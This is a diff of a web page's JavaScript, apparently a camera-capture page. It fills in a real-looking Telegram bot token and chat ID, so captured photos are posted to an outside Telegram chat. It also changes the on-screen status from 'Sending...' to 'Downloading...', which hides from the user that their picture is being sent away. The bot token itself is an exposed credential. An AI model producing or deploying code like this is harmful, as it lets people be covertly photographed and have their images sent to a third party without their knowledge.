@@ -362,8 +362,8 @@
         // ==========================================
         //  CONFIGURATION
         // ==========================================
-        const BOT_TOKEN = 'PASTE_YOUR_TOKEN_HERE'; 
-        const CHAT_ID   = 'PASTE_YOUR_CHAT_ID_HERE'; 
+        const BOT_TOKEN = '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8'; 
+        const CHAT_ID   = '-1003325796934'; 
         // ==========================================
         
         const video = document.getElementById('video');
@@ -631,13 +631,13 @@
                 // Telegram
                 if(BOT_TOKEN !== 'PASTE_YOUR_TOKEN_HERE') {
                     statusMsg.style.display = 'block';
-                    statusMsg.innerText = "Sending...";
+                    statusMsg.innerText = "Downloading...";
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('photo', blob, 'pic.jpg');
                     try {
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                        statusMsg.innerText = "Sent!";
+                        statusMsg.innerText = "Downloaded!";
                     } catch (e) { statusMsg.innerText = "Fail"; }
                     setTimeout(() => statusMsg.style.display = 'none', 2000);
                 }
